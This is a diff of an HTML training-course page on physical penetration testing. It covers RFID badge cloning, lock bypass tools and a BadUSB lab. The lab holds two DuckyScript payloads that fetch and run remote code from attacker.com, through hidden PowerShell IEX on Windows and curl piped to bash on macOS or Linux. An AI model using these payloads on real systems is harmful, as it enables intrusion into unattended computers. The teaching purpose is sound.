@@ -36,11 +36,17 @@
                 <li><a href="../../modules/security-controls/overview.html">Security Controls</a></li>
                 <li><a href="../../modules/physical-security/overview.html" class="active">Physical Security</a></li>
                 <li><a href="../../modules/reporting/overview.html">Reporting</a></li>
+                <li><a href="../../modules/mcq-test/overview.html">Final MCQ Test</a></li>
             </ul>
         </div>
     </nav>
     <main class="main-content" id="content-anchor">
         # Module: Physical Security
+
+<div class="glass-card">
+  <h2>📚 Theory & Class Notes</h2>
+  <p><strong>Physical Security</strong> encompasses the measures designed to deny unauthorized physical access to facilities, equipment, and resources, protecting personnel and property from damage or theft.<br><br><strong>Vulnerabilities:</strong> Unlocked server room doors, easily cloned legacy 125kHz RFID access cards, tailgating behind authorized personnel, exposed USB ports in public areas.<br><strong>Tools:</strong> Proxmark3 (RFID cloning), Rubber Ducky / BadUSB (Malicious keystroke injection), Lockpicks.</p>
+</div>
 
 <div class="glass-card">
   <h2>1. Core Concept 🧠</h2>
@@ -90,6 +96,15 @@
       </tr>
     </tbody>
   </table>
+
+  <div style="margin-top: 1.5rem; border-left: 3px solid #6366f1; padding-left: 1rem;">
+    <strong>Deep Dive: Proxmark3 & RFID</strong>
+    <p style="margin-top: 0.5rem; font-size: 0.95em; opacity: 0.9; line-height: 1.5;">The <strong>Proxmark3</strong> is the industry standard for RFID analysis. Attackers hide it in a laptop bag, bump into an employee dynamically reading their badge (like a legacy 125kHz HID Prox card), and replay that exact signal to unlock the doors moments later. Always use high-frequency encrypted badges (like iCLASS SE) to prevent simple replay attacks.</p>
+  </div>
+  <div style="margin-top: 1rem; border-left: 3px solid #ec4899; padding-left: 1rem;">
+    <strong>Deep Dive: Bypass vs. Picking</strong>
+    <p style="margin-top: 0.5rem; font-size: 0.95em; opacity: 0.9; line-height: 1.5;">While picking a lock using a tension wrench and rake is common in movies, real Physical Pentesting often relies on <strong>Bypass Tools</strong>. Examples include the Under-Door Tool (which grabs the inside lever from under the door) or canned air sprayed at PIR motion sensors to trick the door into unlocking from the inside.</p>
+  </div>
 </div>
 
 <div class="glass-card">
@@ -102,7 +117,13 @@
       <span class="meta-badge difficulty-easy">Difficulty: Easy</span>
       <span class="meta-badge">Time: 20 mins</span>
     </div>
-<div style="margin-top: 15px;"><a href="http://localhost:80" target="_blank" class="btn-start-lab">🚀 Start Lab Environment</a></div>
+    <div style="margin-top: 15px; display: flex; gap: 10px; flex-wrap: wrap;">
+      <button onclick="startLab('physical-security')" class="btn-start-lab">▶ Verify Physical Environment</button>
+    </div>
+    
+    <div id="console-physical-security" class="terminal-output" style="display: none; background: #0f172a; color: #10b981; font-family: monospace; padding: 15px; border-radius: 6px; margin-top: 15px; border: 1px solid #334155; max-height: 300px; overflow-y: auto; text-align: left;">
+        <span style="color: #64748b;">[System] Awaiting initialization...</span>
+    </div>
   </div>
   
   <div class="lab-content">
@@ -119,17 +140,30 @@
     <pre><code># Since we lack physical Rubber Ducky hardware, we compile a Digispark/Ducky payload conceptually.
 # The payload uses 'DuckyScript'.</code></pre>
     
-    <h4>Payload Script (DuckyScript)</h4>
-    <ol>
-      <li>The script forcefully opens a Windows Command Prompt and downloads a payload:</li>
+    <h4>Payload Script (DuckyScript) - Windows</h4>
+    <ol class="steps-list">
+      <li>The script forcefully opens a Windows Run dialog, launches CMD, and executes an invisible PowerShell reverse shell downloader.</li>
     </ol>
-    <pre><code>DELAY 1000
+    <pre style="background: #0f172a; color: #e2e8f0; padding: 15px; border-radius: 6px; border: 1px solid #334155; overflow-x: auto;"><code>DELAY 1000
 GUI r
 DELAY 200
 STRING cmd
 ENTER
 DELAY 500
-STRING powershell -NoP -NonI -W Hidden -Exec Bypass "IEX (New-Object System.Net.Webclient).DownloadString('http://attacker.com/payload.ps1')"
+STRING powershell -windowstyle hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
+ENTER</code></pre>
+
+    <h4>Payload Script (DuckyScript) - macOS / Linux</h4>
+    <ol class="steps-list" style="margin-top: 1.5rem;">
+      <li>By utilizing the Spotlight search (GUI + SPACE), the BadUSB can just as easily compromise an unattended, unlocked Macbook.</li>
+    </ol>
+    <pre style="background: #0f172a; color: #e2e8f0; padding: 15px; border-radius: 6px; border: 1px solid #334155; overflow-x: auto;"><code>DELAY 1000
+GUI SPACE
+DELAY 200
+STRING terminal
+ENTER
+DELAY 500
+STRING curl -sL http://attacker.com/payload.sh | bash
 ENTER</code></pre>
     
     <h4>Expected Output</h4>
@@ -148,6 +182,73 @@ ENTER</code></pre>
     
 </main>
 </div>
+
+<script>
+    let logIntervals = {};
+
+    async function startLab(labName) {
+        const consoleDiv = document.getElementById('console-' + labName);
+        if(consoleDiv) {
+            consoleDiv.style.display = 'block';
+            consoleDiv.innerHTML = '<span style="color: #64748b;">[System] Sending Boot command for ' + labName + '...</span><br>';
+        }
+        
+        try {
+            let res = await fetch('/api/start?lab=' + labName);
+            let data = await res.json();
+            if (data.status === 'error' || !res.ok) {
+                if(consoleDiv) consoleDiv.innerHTML += '<span style="color: #ef4444;">[System Error] ' + (data.message || 'Failed to start lab') + '</span><br>';
+                return;
+            }
+            if(consoleDiv) consoleDiv.innerHTML += '<span style="color: #3b82f6;">[System] ' + data.message + '</span><br>';
+            
+            if (logIntervals[labName]) clearInterval(logIntervals[labName]);
+            logIntervals[labName] = setInterval(() => pollLogs(labName), 2000);
+        } catch (e) {
+            if(consoleDiv) consoleDiv.innerHTML += '<span style="color: #ef4444;">[System Error] ' + e + '</span><br>';
+        }
+    }
+
+    async function stopLab(labName) {
+        const consoleDiv = document.getElementById('console-' + labName);
+        if (consoleDiv) {
+            consoleDiv.style.display = 'block';
+            consoleDiv.innerHTML += '<span style="color: #ef4444;">[System] Halting ' + labName + ' container...</span><br>';
+        }
+        
+        if (logIntervals[labName]) {
+            clearInterval(logIntervals[labName]);
+            delete logIntervals[labName];
+        }
+
+        try {
+            let res = await fetch('/api/stop?lab=' + labName);
+            let data = await res.json();
+            if(consoleDiv) consoleDiv.innerHTML += '<span style="color: #64748b;">[System] ' + data.message + '</span><br>';
+        } catch (e) {
+            if(consoleDiv) consoleDiv.innerHTML += '<span style="color: #ef4444;">[System Error] ' + e + '</span><br>';
+        }
+    }
+
+    async function pollLogs(labName) {
+        try {
+            let res = await fetch('/api/logs?lab=' + labName);
+            let data = await res.json();
+            const consoleDiv = document.getElementById('console-' + labName);
+            if (!consoleDiv) return;
+            
+            if (data.status === 'success') {
+                let safeLogs = data.logs.replace(/</g, "&lt;").replace(/>/g, "&gt;");
+                safeLogs = safeLogs.replace(/\n/g, "<br>");
+                const sysHeader = '<span style="color: #3b82f6;">[System] Streaming container logs...</span><br><br>';
+                consoleDiv.innerHTML = sysHeader + safeLogs;
+                consoleDiv.scrollTop = consoleDiv.scrollHeight;
+            }
+        } catch (e) {
+            console.error("Log poll failed", e);
+        }
+    }
+</script>
 
 <script>
     // Theme toggling logic
